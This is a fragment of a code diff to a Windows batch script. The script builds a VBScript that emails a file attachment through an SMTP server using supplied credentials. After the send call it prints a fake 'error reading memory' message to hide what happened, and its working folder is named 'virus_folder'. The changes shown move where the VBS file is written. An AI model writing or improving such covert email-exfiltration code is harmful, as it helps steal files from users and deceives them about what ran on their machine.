@@ -21,7 +21,7 @@ set "Auth=%~6"
 set "Pass=%~7"
 set "fileattach=%~8"
 )
-call :createVBS "C:\virus_folder\email-bat.vbs"
+call :createVBS "email-bat.vbs"
 call :send %From% %To% %Subj% %Body% %Serv% %Auth% %Pass%
 echo error reading memory at 0X900C
 pause
@@ -32,7 +32,7 @@ cscript.exe /nologo "%vbsfile%" %1 %2 %3 %4 %5 %6 %7
 goto :EOF
 
 :createVBS
-set "vbsfile=C:\virus_folder\"
+set "vbsfile=~%1"
 del "%vbsfile%" 2>nul
 set cdoSchema=http://schemas.microsoft.com/cdo/configuration
 echo >>"%vbsfile%" Set objArgs       = WScript.Arguments
